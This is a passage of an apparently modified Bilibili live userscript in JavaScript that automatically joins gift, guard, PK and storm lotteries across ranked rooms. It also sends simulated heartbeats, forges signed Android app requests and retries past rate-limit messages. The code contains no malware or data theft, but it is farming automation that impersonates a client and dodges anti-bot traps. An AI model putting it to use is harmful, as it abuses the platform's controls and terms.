		    if (!CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY && !CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD) {
			window.toast('[自动抽奖]不需要连接弹幕服务器', 'info');
			return;
		    }
		    if (CONFIG.AUTO_LOTTERY_CONFIG.HIDE_POPUP) {
			addCSS('#chat-popup-area-vm {display: none;}');
		    }
		    Lottery.listenAll();
		    if (CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL > 0) {
			setInterval(() => {
			    Lottery.listenAll();
			}, CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL *
				    60e3);
		    }
		    setInterval(() => {
			if (Lottery.createCount > 0) --Lottery.createCount;
		    }, 10e3);
		    if (CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL > 0) {
			setTimeout(() => {
			    // if(!BiliPush.connected){
			    //     location.reload();
			    // }
			}, CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL * 60e3);
		    }
		} catch (err) {
		    window.toast('[自动抽奖]运行时出现异常，已停止', 'error');
		    console.error(`[${NAME}]`, err);
		}
	    }
	}; // Constantly Run

	const createIframe = (url, type, name) => {
	    const iframe = $(`<iframe style="display: none;"></iframe>`)[0];
	    if (!name) name =
		`_${Math.floor(Math.random() * 10000 + Math.random() * 1000 + Math.random() * 100 + Math.random() * 10).toString(16)}`;
	    iframe.name = name;
	    iframe.src = `${url}/${iframe.name}`;
	    document.body.appendChild(iframe);
	    const pFinish = $.Deferred();
	    pFinish.then(() => {
		window[NAME].iframeSet.delete(iframe);
		$(iframe).remove();
	    });
	    const autoDel = setTimeout(() => pFinish.resolve(), 60e3); // iframe默认在60s后自动删除
	    const pInit = $.Deferred();
	    pInit.then(() => clearTimeout(autoDel)); // 如果初始化成功，父脚本不自动删除，由子脚本决定何时删除，否则说明子脚本加载失败，这个iframe没有意义
	    const up = () => {
		CACHE = window[NAME].CACHE;
		Info = window[NAME].Info;
		Essential.Cache.save();
		const pUp = $.Deferred();
		pUp.then(up);
		iframe[NAME].promise.up = pUp;
	    };
	    const pUp = $.Deferred();
	    pUp.then(up);
	    iframe[NAME] = {
		type: type,
		promise: {
		    init: pInit, // 这个Promise在子脚本加载完成时resolve
		    finish: pFinish, // 这个Promise在iframe需要删除时resolve
		    down: $.Deferred(), // 这个Promise在子脚本的CONIG、CACHE、Info等需要重新读取时resolve
		    up: pUp
		}
	    };
	    window[NAME].iframeSet.add(iframe);
	    DEBUG('createIframe', iframe);
	};

	const Init = () => {
	    try {
		const promiseInit = $.Deferred();
		scriptRuning = true;
		console.log("魔改脚本成功运行...")
		Essential.init().then(() => {
		    console.log("脚本配置加载完毕...")
		    try {
			API = BilibiliAPI;
		    } catch (err) {
			window.toast('BilibiliAPI初始化失败，请检查网络和依赖项访问是否正常！', 'error');
			console.error(`[${NAME}]`, err);
			return p1.reject();
		    }
		    try {
			TokenUtil = BilibiliToken;
			Token = new TokenUtil();
		    } catch (err) {
			TokenUtil = null;
			Token = null;
			window.toast('BilibiliToken 初始化失败，移动端功能可能失效！请检查网络和依赖项访问是否正常！', 'error');
			console.error(`[${NAME}]`, err);
		    }
		    const uniqueCheck = () => {
			const p1 = $.Deferred();
			const t = Date.now() / 1000;
			//console.log('CACHE.unique_check',CACHE.unique_check, Date.now() / 1000);
			if (t - CACHE.unique_check >= 0 && t - CACHE.unique_check <= 60) {
			    // 其他脚本正在运行
			    return p1.reject();
			}
			// 没有其他脚本正在运行
			return p1.resolve();
		    };
		    uniqueCheck().then(() => {
			let timer_unique;
			const uniqueMark = () => {
			    timer_unique = setTimeout(uniqueMark, 2e3);
			    //console.log('CACHE.uniqueMark',CACHE.unique_check, Date.now() / 1000);
			    CACHE.unique_check = Date.now() / 1000;
			    //console.log('CACHE.uniqueMark',CACHE.unique_check, Date.now() / 1000);
			    Essential.Cache.save();
			};
			window.addEventListener('unload', () => {
			    if (timer_unique) {
				clearTimeout(timer_unique);
				CACHE.unique_check = 0;
				Essential.Cache.save();
			    }
			});
			uniqueMark();
			window.toast('正在初始化脚本...', 'info');
			const InitData = () => {
			    const p = $.Deferred();
			    let initFailed = false;
			    const p2 = $.Deferred();
			    p2.then(() => {
				initFailed = true;
			    });
			    let timer_p2 = setTimeout(() => p2.resolve(), 30e3);
			    let tryCount = 0;
			    runUntilSucceed(() => {
				try {
				    if (initFailed) {
					timer_p2 = undefined;
					window.toast('初始化用户数据、直播间数据超时，请关闭广告拦截插件后重试',
						     'error');
					p.reject();
					return true;
				    }
				    if (!window.BilibiliLive || parseInt(window.BilibiliLive
									 .ROOMID, 10) === 0 || !window.__statisObserver)
					return false;
				    DEBUG('Init: InitData: BilibiliLive', window.BilibiliLive);
				    DEBUG('Init: InitData: __statisObserver',
					  window.__statisObserver);
				    clearTimeout(timer_p2);
				    timer_p2 = undefined;
				    if (parseInt(window.BilibiliLive.UID, 10) ===
					0 || isNaN(parseInt(window.BilibiliLive.UID,
							    10))) {
					if (tryCount > 20) {
					    window.toast('你还没有登录，助手无法使用！',
							 'caution');
					    p.reject();
					    return true;
					} else {
					    return false;
					}
				    }
				    Info.short_id = window.BilibiliLive.SHORT_ROOMID;
				    Info.roomid = window.BilibiliLive.ROOMID;
				    Info.uid = window.BilibiliLive.UID;
				    Info.ruid = window.BilibiliLive.ANCHOR_UID;
				    Info.rnd = window.BilibiliLive.RND;
				    Info.csrf_token = getCookie('bili_jct');
				    Info.visit_id = window.__statisObserver ?
					window.__statisObserver.__visitId : '';
				    API.setCommonArgs(Info.csrf_token, '');
				    const p1 = API.live_user.get_info_in_room(Info.roomid)
				    .then((response) => {
					DEBUG(
					    'InitData: API.live_user.get_info_in_room',
					    response);
					Info.silver = response.data.wallet.silver;
					Info.gold = response.data.wallet.gold;
					Info.uid = response.data.info.uid;
					Info.mobile_verify = response.data.info
					    .mobile_verify;
					Info.identification = response.data
					    .info.identification;
				    });
				    const p2 = API.gift.gift_config().then((
					response) => {
					DEBUG(
					    'InitData: API.gift.gift_config',
					    response);
					if ($.type(response.data) ==
					    "array") {
					    Info.gift_list = response.data;
					} else if ($.type(response.data.list) ==
						   "array") {
					    Info.gift_list = response.data.list;
					} else {
					    Info.gift_list = [];
					    window.toast('直播间礼物数据获取失败',
							 'error');
					    return;
					}
					Info.gift_list.forEach((v, i) => {
					    if (i % 3 === 0) Info.gift_list_str +=
						'<br>';
					    Info.gift_list_str +=
						`${v.id}：${v.name}`;
					    if (i < Info.gift_list.length -
						1) Info.gift_list_str +=
						'，';
					});
				    });
				    $.when(p1, p2).then(() => {
					if (parseInt(window.BilibiliLive.UID,
						     10) === 0 || isNaN(parseInt(
					    window.BilibiliLive.UID,
					    10))) {
					    window.toast('你还没有登录，助手无法使用！',
							 'caution');
					    p.reject();
					    return;
					}
					Essential.DataSync.down();
					p.resolve();
				    }, () => {
					window.toast('初始化用户数据、直播间数据失败',
						     'error');
					p.reject();
				    });
				    return true;
				} catch (err) {
				    if (timer_p2) clearTimeout(timer_p2);
				    window.toast('初始化用户数据、直播间数据时出现异常', 'error');
				    console.error(`[${NAME}]`, err);
				    p.reject();
				    return true;
				}
			    }, 1, 500);
			    return p;
			};
			const InitFunctions = () => {
			    const promiseInitFunctions = $.Deferred();
			    $.when(TreasureBox.init()).then(() => promiseInitFunctions.resolve(),
							    () => promiseInitFunctions.reject());
			    return promiseInitFunctions;
			};
			InitData().then(() => {
			    InitFunctions().then(() => {
				promiseInit.resolve();
			    }, () => promiseInit.reject());
			}, () => promiseInit.reject());
		    }, () => {
			window.toast('有其他直播间页面的脚本正在运行，本页面脚本停止运行', 'caution');
			promiseInit.reject();
		    });
		});
		return promiseInit;
	    } catch (err) {
		window.toast('初始化时出现异常', 'error');
		console.error(`[${NAME}]`, err);
		return $.Deferred().reject();
	    }
	};

	const TopRankTask = {
	    process: async () => {
		try {
		    if(CONFIG.AUTO_LOTTERY_CONFIG.RANK_TOP){
			window.toast('开始扫描小时榜...', 'info');
			let roomSet = new Set();
			let toprank = await delayCall(() => BiliPushUtils.API.LiveRank.topRank(), 1000);
			let areaRank = await delayCall(() => BiliPushUtils.API.LiveRank.areaRank(0), 1000);
			let rankList = [toprank, areaRank];
			let getListRsp = await API.room.getList();
			if (getListRsp.code == 0 && getListRsp.data) {
			    for (let areaInfo of getListRsp.data) {
				let areaRank = await delayCall(() => BiliPushUtils.API.LiveRank.areaRank(
				    areaInfo.id), 1000)
				rankList.push(areaRank);
			    }
			}
			for (let rsp of rankList) {
			    if (rsp.code == 0 && rsp.data.list) {
				for (let room of rsp.data.list) {
				    roomSet.add(room.roomid)
				}
			    }
			}
			for (let roomid of roomSet) {
			    await BiliPushUtils.Check.run(roomid);
			}
		    }
		    await delayCall(() => TopRankTask.run(), 300e3);
		} catch (err) {
		    console.error(`[${NAME}]`, err);
		    return delayCall(() => TopRankTask.run());
		}
	    },
	    run: async () => {
		try {
		    let done = true;
		    if (!CONFIG.AUTO_LOTTERY) {
			done = false;
		    }
		    //if (Info.blocked) return $.Deferred().resolve();
		    if (!CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY && !CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD) {
			done = false;
		    }
		    if (!BiliPush.connected) {
			done = false;
		    }
		    if (!done) {
			setTimeout(() => TopRankTask.run(), 5000);
			return $.Deferred().resolve();
		    } else {
			await TopRankTask.process();
			return $.Deferred().resolve();
		    }
		} catch (err) {
		    window.toast('[直播小时榜]运行时出现异常，已停止', 'error');
		    console.error(`[${NAME}]`, err);
		    return $.Deferred().reject();
		}
	    }
	}; // Once Run every 1 mins

	const BiliPushUtils = {
	    raffleIdSet: new Set(),
	    guardIdSet: new Set(),
	    pkIdSet: new Set(),
	    stormBlack: false,
	    stormQueue: [],
	    lastEnter:null,
	    enterSet: new Set(),
	    initSet: new Set(),
	    sign: null,
	    msgIgnore: (msg) => {
		if (msg) {
		    let ignoreList = ['操作太快', '稍后再试', '请求太多', '频繁', '繁忙'];
		    for (let ignore of ignoreList) {
			if (msg.indexOf(ignore) > -1) {
			    return true;
			}
		    }
		}
		return false;
	    },
	    clearSet: () => {
		BiliPushUtils.splitSet(BiliPushUtils.raffleIdSet, 1500, 2);
		BiliPushUtils.splitSet(BiliPushUtils.guardIdSet, 200, 2);
		BiliPushUtils.splitSet(BiliPushUtils.pkIdSet, 200, 2);
	    },
	    splitSet: (set, limit, rate = 2) => {
		if (set && set.size > limit) {
		    let end = limit / rate;
		    for (let item of set.entries()) {
			if (item[0] <= end) {
			    set.delete(item[1]);
			}
		    }
		}
	    },
	    up: () => {
		window.parent[NAME].Info = Info;
		window.parent[NAME].CACHE = CACHE;
		if (window.frameElement && window.frameElement[NAME]) {
		    window.frameElement[NAME].promise.up.resolve();
		}
	    },
	    processing: 0,
	    ajax: (setting, roomid) => {
		const p = jQuery.Deferred();
		runUntilSucceed(() => {
		    if (BiliPushUtils.processing > 5) return false;
		    ++BiliPushUtils.processing;
		    return BiliPushUtils._ajax(setting).then((arg1, arg2, arg3) => {
			--BiliPushUtils.processing;
			p.resolve(arg1, arg2, arg3);
			return true;
		    }).catch((arg1, arg2, arg3) => {
			--BiliPushUtils.processing;
			p.reject(arg1, arg2, arg3);
			return true;
		    });
		});
		return p;
	    },
	    _ajax: (setting) => {
		let url = (setting.url.substr(0, 2) === '//' ? '' : '//api.live.bilibili.com/') + setting.url;
		let option = {
		    method: setting.method || "GET",
		    headers: setting.headers || {},
		    credentials: 'include',
		    mode: 'cors'
		};
		if (setting.roomid) {
		    option.referrer = location.protocol + "//" + location.hostname + "/" + setting.roomid;
		}
		if (option.method == "GET") {
		    if (setting.data) {
			url = `${url}?${$.param(setting.data)}`;
		    }
		} else {
		    option.headers["content-type"] = "application/x-www-form-urlencoded";
		    if (setting.data) {
			option.body = $.param(setting.data);
		    }
		}
		return fetch(url, option).then(r => r.json());
	    },
	    ajaxWithCommonArgs: (setting) => {
		if (setting.data) {
		    setting.data.csrf = Info.csrf_token;
		    setting.data.csrf_token = Info.csrf_token;
		}
		return BiliPushUtils.ajax(setting);
	    },
	    corsAjax: (setting) => {
		const p = jQuery.Deferred();
		runUntilSucceed(() => {
		    return new Promise(success => {
			let option = BiliPushUtils._corsAjaxSetting(setting);
			option.onload = (rsp) => {
			    if (rsp.status == 200) {
				p.resolve(rsp.response);
			    } else {
				p.reject(rsp);
			    }
			    success();
			};
			option.onerror = (err) => {
			    p.reject(err);
			    success();
			}
			GM_xmlhttpRequest(option);
		    });
		});
		return p;
	    },
	    _corsAjaxSetting: (setting) => {
		let url = (setting.url.substr(0, 2) === '//' ? location.protocol + '//' : location.protocol +
			   '//api.live.bilibili.com/') + setting.url;
		let option = {
		    url: url,
		    method: setting.method || "GET",
		    headers: setting.headers || {},
		    responseType: 'json',
		};
		if (option.method == "GET") {
		    if (setting.data) {
			url = `${url}?${$.param(setting.data)}`;
		    }
		} else {
		    option.headers["content-type"] = "application/x-www-form-urlencoded";
		    if (setting.data) {
			option.data = $.param(setting.data);
		    }
		}
		return option;
	    },
	    corsAjaxWithCommonArgs: (setting) => {
		if (setting.data) {
		    setting.data.csrf = Info.csrf_token;
		    setting.data.csrf_token = Info.csrf_token;
		}
		return BiliPushUtils.corsAjax(setting);
	    },
	    BaseRoomAction: async (roomid) => {
		//推送开启的话 信任推送数据
		if (BiliPush.connected) {
		    return false;
		} else {
		    try{
			if(BiliPushUtils.lastEnter){
			    if(new Date().getDate() != BiliPushUtils.lastEnter.getDate()){
				BiliPushUtils.enterSet.clear();
				BiliPushUtils.initSet.clear();
			    }
			    BiliPushUtils.lastEnter = new Date();
			}
			BiliPushUtils.lastEnter = new Date();
			if(BiliPushUtils.initSet.has(roomid)){
			    return false;
			}
			let response = await BiliPushUtils.API.room.room_init(roomid);
			DEBUG('BiliPushUtils.BaseRoomAction: BiliPushUtils.API.room.room_init',response);
			if (response.code === 0) {
			    if (response.data.is_hidden || response.data.is_locked || response.data.encrypted || response.data.pwd_verified) {
				return true;
			    }
			}
			BiliPushUtils.initSet.add(roomid);
			return false;
		    }catch(e){
			throw(e);
		    }finally{
			if(!BiliPushUtils.enterSet.has(roomid)){
			    BiliPushUtils.enterSet.add(roomid);
			    await BiliPushUtils.API.room.room_entry_action(roomid);
			}
		    }
		}
	    },
	    API: {
		HeartGift: {
		    enter: (data,room_id) => {
			return BiliPushUtils.ajaxWithCommonArgs({
			    method: 'POST',
			    url: '//live-trace.bilibili.com/xlive/data-interface/v1/x25Kn/E',
			    data: data,
			    roomid: room_id
			});
		    },
		    heart: (data,room_id) => {
			return BiliPushUtils.ajaxWithCommonArgs({
			    method: 'POST',
			    url: '//live-trace.bilibili.com/xlive/data-interface/v1/x25Kn/X',
			    data: data,
			    roomid: room_id
			});
		    }
		},
		LiveRank: {
		    topRank: () => {
			return BiliPushUtils.ajax({
			    url: 'rankdb/v1/Rank2018/getTop?type=master_realtime_hour&type_id=areaid_realtime_hour'
			});
		    },
		    areaRank: (areaid) => {
			return BiliPushUtils.ajax({
			    url: 'rankdb/v1/Rank2018/getTop?&type=master_last_hour&type_id=areaid_hour&page_size=10&area_id=' +
			    areaid
			});
		    }
		},
		Heart: {
		    mobile: () => {
			let appheaders = {};
			let param = "";
			if (Token && TokenUtil) {
			    appheaders = Token.headers
			    if (Info.appToken) {
				param = TokenUtil.signQuery(KeySign.sort({
				    access_key: Info.appToken.access_token,
				    appkey: TokenUtil.appKey,
				    actionKey: 'appkey',
				    build: 5561000,
				    channel: 'bili',
				    device: 'android',
				    mobi_app: 'android',
				    platform: 'android',
				}));
			    }
			}
			return BiliPushUtils.corsAjax({
			    method: 'POST',
			    url: `heartbeat/v1/OnLine/mobileOnline?${param}`,
			    data: {
				'roomid': 21438956,
				'scale': 'xxhdpi'
			    },
			    headers: appheaders
			});
		    },
		    mobile_login: () => {
			let param = TokenUtil.signLoginQuery(KeySign.sort({
			    access_key: Info.appToken.access_token
			}));
			return BiliPushUtils.corsAjax({
			    method: 'GET',
			    url: `//passport.bilibili.com/x/passport-login/oauth2/info?${param}`,
			    headers: Token.headers
			});
		    },
		    mobile_info: () => {
			let param = TokenUtil.signQuery(KeySign.sort({
			    access_key: Info.appToken.access_token,
			    room_id: 21438956,
			    appkey: TokenUtil.appKey,
			    actionKey: 'appkey',
			    build: 5561000,
			    channel: 'bili',
			    device: 'android',
			    mobi_app: 'android',
			    platform: 'android',
			}));
			return BiliPushUtils.corsAjax({
			    method: 'GET',
			    url: `xlive/app-room/v1/index/getInfoByUser?${param}`,
			    headers: Token.headers
			});
		    },
		    pc: (success) => {
			return BiliPushUtils.corsAjaxWithCommonArgs({
			    method: 'POST',
			    url: 'User/userOnlineHeart',
			    data: {}
			});
		    }
		},
		Check: {
		    check: (roomid) => {
			return BiliPushUtils.ajax({
			    url: 'xlive/lottery-interface/v1/lottery/Check?roomid=' + roomid,
			    roomid: roomid
			});
		    },
		},
		Storm: {
		    check: (roomid) => {
			// 检查是否有节奏风暴
			return BiliPushUtils.ajax({
			    url: 'xlive/lottery-interface/v1/storm/Check?roomid=' + roomid,
			    roomid: roomid
			});
		    },
		    join: (id, roomid, captcha_token = "", captcha_phrase = "", color = 15937617) => {
			// 参加节奏风暴
			return BiliPushUtils.ajaxWithCommonArgs({
			    method: 'POST',
			    url: 'xlive/lottery-interface/v1/storm/Join',
			    data: {
				id: id,
				color: color,
				captcha_token: captcha_token,
				captcha_phrase: captcha_phrase,
				roomid: roomid
			    },
			    roomid: roomid
			});
		    },
		    join_ex: (id, roomid, captcha_token = "", captcha_phrase = "", color = 15937617) => {
			// 参加节奏风暴
			let param = TokenUtil.signQuery(KeySign.sort({
			    id: id,
			    access_key: Info.appToken.access_token,
			    appkey: TokenUtil.appKey,
			    actionKey: 'appkey',
			    build: 5561000,
			    channel: 'bili',
			    device: 'android',
			    mobi_app: 'android',
			    platform: 'android',
			}));
			return BiliPushUtils.corsAjaxWithCommonArgs({
			    method: 'POST',
			    url: `xlive/lottery-interface/v1/storm/Join?${param}`,
			    headers: Token.headers,
			    roomid: roomid
			});
		    }
		},
		Guard: {
		    join: (roomid, id, type = 'guard') => {
			return BiliPushUtils.ajaxWithCommonArgs({
			    method: 'POST',
			    url: 'xlive/lottery-interface/v3/guard/join',
			    data: {
				roomid: roomid,
				id: id,
				type: type
			    },
			    roomid: roomid
			});
		    },
		},
		Gift: {
		    join: (roomid, id, type = 'small_tv') => {
			return BiliPushUtils.ajaxWithCommonArgs({
			    method: 'POST',
			    url: 'xlive/lottery-interface/v5/smalltv/join',
			    data: {
				roomid: roomid,
				id: id,
				type: type
			    },
			    roomid: roomid
			});
		    }
		},
		room: {
		    room_entry_action: (room_id, platform = 'pc') => {
			return BiliPushUtils.ajaxWithCommonArgs({
			    method: 'POST',
			    url: 'room/v1/Room/room_entry_action',
			    data: {
				room_id: room_id,
				platform: platform
			    },
			    roomid: room_id
			});
		    },
		    room_init: (id) => {
			return BiliPushUtils.ajax({
			    url: 'room/v1/Room/room_init?id=' + id,
			    roomid: id
			});
		    },
		},
		Pk: {
		    join: (roomid, id) => {
			return BiliPushUtils.ajaxWithCommonArgs({
			    method: 'POST',
			    url: 'xlive/lottery-interface/v1/pk/join',
			    data: {
				roomid: roomid,
				id: id
			    },
			    roomid: roomid
			});
		    }
		}
	    },
	    Check: {
		roomSet: new Set(),
		roomCacheSet: new Set(),
		sleepTimeRange: [],
		sleepTimeRangeBuild: () => {
		    const value = CONFIG.AUTO_LOTTERY_CONFIG.SLEEP_RANGE;
		    let time_range = [];
		    let options = value.split(',');
		    for (let timerangstr of options) {
			let time_tmp = [];
			let baseTimes = timerangstr.split('-');
			if (baseTimes && baseTimes.length == 2) {
			    let timeArray1 = baseTimes[0].split(':');
			    let timeArray2 = baseTimes[1].split(':');
			    time_range.push({
				bh: parseInt(timeArray1[0]),
				bm: parseInt(timeArray1[1]),
				eh: parseInt(timeArray2[0]),
				em: parseInt(timeArray2[1]),
				str: timerangstr
			    });
			}
		    }
		    BiliPushUtils.Check.sleepTimeRange = time_range;
		    return time_range;
		},
		checkSleep: () => {
		    let srange = BiliPushUtils.Check.sleepTimeRange;
		    const now = new Date();

		    function dayTime(hours, mins) {
			return new Date().setHours(hours, mins, 0, 0)
		    }
		    let f = srange.find(it => dayTime(it.bh, it.bm) <= now && now <= dayTime(it.eh, it.em));
		    return f;
		},
		start: async () => {
		    try {
			//var tmp = Array.from(BiliPushUtils.Check.roomSet);
			//检查是否休眠
			if (!BiliPushUtils.Check.checkSleep()) {
			    BiliPushUtils.Check.roomCacheSet.clear();
			    for (let room_id of BiliPushUtils.Check.roomSet) {
				if (BiliPushUtils.Check.checkSleep()) {
				    break;
				}
				if (BiliPushUtils.Check.roomSet.has(room_id)) {
				    BiliPushUtils.Check.roomSet.delete(room_id);
				    await BiliPushUtils.Check.process(room_id);
				    await delayCall(() => {}, 300);
				}
			    }
			}
			setTimeout(() => BiliPushUtils.Check.start(), 1000);
			return $.Deferred().resolve();
		    } catch (e) {
			setTimeout(() => BiliPushUtils.Check.start(), 1000);
			return $.Deferred().reject();
		    }
		},
		run: (roomid) => {
		    if (!CONFIG.AUTO_LOTTERY) return $.Deferred().resolve();
		    //if (Info.blocked) return $.Deferred().resolve();
		    if (!CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY && !CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD)
			return $.Deferred().resolve();
		    let sleep = BiliPushUtils.Check.checkSleep();
		    if (sleep) {
			console.log(`自动休眠 ${sleep.str} 跳过抽奖检测,roomid=${roomid}`);
			return $.Deferred().resolve();
		    }
		    if (!BiliPushUtils.Check.roomCacheSet.has(roomid)) {
			BiliPushUtils.Check.roomCacheSet.add(roomid);
			BiliPushUtils.Check.roomSet.add(roomid);
		    }
		    return $.Deferred().resolve();
		},
		process: (roomid) => {
		    try {
			if (!CONFIG.AUTO_LOTTERY) return $.Deferred().resolve();
			//if (Info.blocked) return $.Deferred().resolve();
			if (!CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY && !CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD)
			    return $.Deferred().resolve();
			let sleep = BiliPushUtils.Check.checkSleep();
			if (sleep) {
			    console.log(`自动休眠 ${sleep.str} 跳过抽奖检测,roomid=${roomid}`);
			    return $.Deferred().resolve();
			}
			BiliPushUtils.Check.roomSet.delete(roomid);
			return BiliPushUtils.BaseRoomAction(roomid).then((fishing) => {
			    if (!fishing) {
				return BiliPushUtils.API.Check.check(roomid).then((response) => {
				    DEBUG(
					'BiliPushUtils.Check.run: BiliPushUtils.API.Check.check',
					response);
				    if (response.code === 0) {
					var data = response.data;
					if (CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY) {
					    if (data.gift && data.gift.length > 0) {
						BiliPushUtils.Gift.join(roomid, data.gift);
					    }
					}
					if (CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD) {
					    if (data.guard && data.guard.length > 0) {
						BiliPushUtils.Guard.join(roomid, data.guard);
					    }
					}
					if (CONFIG.AUTO_LOTTERY_CONFIG.PK_AWARD) {
					    if (data.pk && data.pk.length > 0) {
						BiliPushUtils.Pk.join(roomid, data.pk);
					    }
					}
					return $.Deferred().resolve();
				    } else {
					window.toast(
					    `[自动抽奖][查询](roomid=${roomid})${response.msg}`,
					    'caution');
				    }
				}, () => {
				    window.toast(`[自动抽奖][查询]检查礼物(${roomid})失败，请检查网络`,
						 'error');
				    return delayCall(() => BiliPushUtils.Check.run(roomid));
				});
			    }
			}, () => {
			    window.toast(`[自动抽奖][查询]检查直播间(${roomid})失败，请检查网络`, 'error');
			    return delayCall(() => BiliPushUtils.Check.run(roomid), 1e3);
			});
		    } catch (err) {
			window.toast('[自动抽奖][查询]运行时出现异常', 'error');
			console.error(`[${NAME}]`, err);
			return $.Deferred().reject();
		    }
		}
	    },
	    Storm: {
		run: (roomid) => {
		    try {
			if (!CONFIG.AUTO_LOTTERY) return $.Deferred().resolve();
			//if (Info.blocked) return $.Deferred().resolve();
			if (BiliPushUtils.stormBlack) return $.Deferred().resolve();
			if (!CONFIG.AUTO_LOTTERY_CONFIG.STORM) return $.Deferred().resolve();
			let sleep = BiliPushUtils.Check.checkSleep();
			if (sleep) {
			    console.log(`自动休眠 ${sleep.str} 跳过风暴检测,roomid=${roomid}`);
			    return $.Deferred().resolve();
			}
			return BiliPushUtils.API.Storm.check(roomid).then((response) => {
			    DEBUG('BiliPushUtils.Storm.run: BiliPushUtils.API.Storm.check',
				  response);
			    if (response.code === 0) {
				var data = response.data;
				if(data.length==0){
				    console.log(`[自动抽奖][节奏风暴]未获取到抽奖(roomid=${roomid})`);
				    return $.Deferred().resolve();
				}
				window.toast(`[自动抽奖][节奏风暴]获取抽奖(roomid=${data.roomid},id=${data.id})`, 'info');
				BiliStorm.join(data.id, data.roomid, Math.round(new Date().getTime() / 1000) + data.time);
				return $.Deferred().resolve();
			    } else {
				window.toast(`[自动抽奖][节奏风暴](roomid=${roomid})${response.msg}`,
					     'caution');
			    }
			}, () => {
			    window.toast(`[自动抽奖][节奏风暴]检查直播间(${roomid})失败，请检查网络`, 'error');
			    //return delayCall(() => BiliPushUtils.Storm.run(roomid));
			});
		    } catch (err) {
			window.toast('[自动抽奖][节奏风暴]运行时出现异常', 'error');
			console.error(`[${NAME}]`, err);
			return $.Deferred().reject();
		    }
		}
	    },
	    Pk: {
		run: (roomid) => (BiliPushUtils.Check.run(roomid)),
		join: async (roomid, ids) => {
		    try {
			//console.log(`Pk.join`,roomid,ids,i)
			if (!ids) return $.Deferred().resolve();
			//if (Info.blocked) return $.Deferred().resolve();
			for (let obj of ids) {
			    // id过滤，防止重复参加
			    var id = parseInt(obj.id, 10);
			    if (BiliPushUtils.pkIdSet.has(id)) return $.Deferred().resolve();
			    BiliPushUtils.pkIdSet.add(id); // 加入id记录列表
			    await BiliPushUtils.Pk._join(roomid, obj.id);
			}
			return $.Deferred().resolve();
		    } catch (e) {
			await delayCall(() => BiliPushUtils.Pk.join(roomid, ids));
		    }
		},
		_join: (roomid, id) => {
		    //if (Info.blocked) return $.Deferred().resolve();
		    roomid = parseInt(roomid, 10);
		    id = parseInt(id, 10);
		    if (isNaN(roomid) || isNaN(id)) return $.Deferred().reject();
		    RafflePorcess.append(roomid, id);
		    window.toast(`[自动抽奖][乱斗领奖]检测到(roomid=${roomid},id=${id})`, 'info');
		    delayCall(() => BiliPushUtils.API.Pk.join(roomid, id).then((response) => {
			DEBUG('BiliPushUtils.Pk._join: BiliPushUtils.API.Pk.join', response);
			if (response.code === 0) {
			    try {
				var giftInfo = response.data.award_text.split('X');
				Statistics.appendGift(giftInfo[0], giftInfo[1] - 0, response.data
						      .award_ex_time);
			    } catch (e) {}
			    window.toast(
				`[自动抽奖][乱斗领奖]领取(roomid=${roomid},id=${id})成功,${response.data.award_text}`,
				'success');
			} else if (response.msg.indexOf('拒绝') > -1) {
			    //Info.blocked = true;
			    //BiliPushUtils.up();
			    //window.toast('[自动抽奖][乱斗领奖]访问被拒绝，您的帐号可能已经被关小黑屋，已停止', 'error');
			} else if (BiliPushUtils.msgIgnore(response.msg)) {
			    return delayCall(() => BiliPushUtils.Pk._join(roomid, id), 1e3);
			} else if (response.msg.indexOf('过期') > -1) {} else {
			    window.toast(
				`[自动抽奖][乱斗领奖](roomid=${roomid},id=${id})${response.msg}`,
				'caution');
			}
			RafflePorcess.remove(roomid, id);
		    }, () => {
			window.toast(`[自动抽奖][乱斗领奖]领取(roomid=${roomid},id=${id})失败，请检查网络`,
				     'error');
			return delayCall(() => BiliPushUtils.Pk._join(roomid, id));
		    }), parseInt(Math.random() * 6) * 1e3);
		    return $.Deferred().resolve();
		}
	    },
	    Gift: {
		run: (roomid) => (BiliPushUtils.Check.run(roomid)),
		join: async (roomid, raffleList) => {
		    try {
			//console.log(`Gift.join`,roomid,raffleList,i)
			//if (Info.blocked) return $.Deferred().resolve();
			//if (i >= raffleList.length) return $.Deferred().resolve();
			for (let obj of raffleList) {
			    if (obj.status === 1) { // 可以参加
				// raffleId过滤，防止重复参加
				var raffleId = parseInt(obj.raffleId, 10);
				if (BiliPushUtils.raffleIdSet.has(raffleId)) return $.Deferred().resolve();
				BiliPushUtils.raffleIdSet.add(raffleId); // 加入raffleId记录列表
				await BiliPushUtils.Gift._join(roomid, obj.raffleId, obj.type, obj.time_wait);
			    } else if (obj.status === 2 && obj.time > 0) { // 已参加且未开奖
			    }
			}
			return $.Deferred().resolve();
		    } catch (e) {
			await delayCall(() => BiliPushUtils.Gift.join(roomid, raffleList), 1e3);
		    }
		},
		_join: (roomid, raffleId, type, time_wait = 0) => {
		    //if (Info.blocked) return $.Deferred().resolve();
		    roomid = parseInt(roomid, 10);
		    raffleId = parseInt(raffleId, 10);
		    if (isNaN(roomid) || isNaN(raffleId)) return $.Deferred().reject();
		    if (!type) {
			delayCall(() => BiliPushUtils.Check.run(roomid));
			return $.Deferred().resolve();
		    }
		    window.toast(
			`[自动抽奖][礼物抽奖]等待抽奖(roomid=${roomid},id=${raffleId},type=${type},time_wait=${time_wait})`,
			'info');
		    RafflePorcess.append(roomid, raffleId);
		    delayCall(() => BiliPushUtils.API.Gift.join(roomid, raffleId, type).then((response) => {
			DEBUG('BiliPushUtils.Gift._join: BiliPushUtils.API.Gift.join', response);
			switch (response.code) {
			    case 0:
				Statistics.appendGift(response.data.award_name, response.data.award_num,
						      response.data.award_ex_time);
				window.toast(
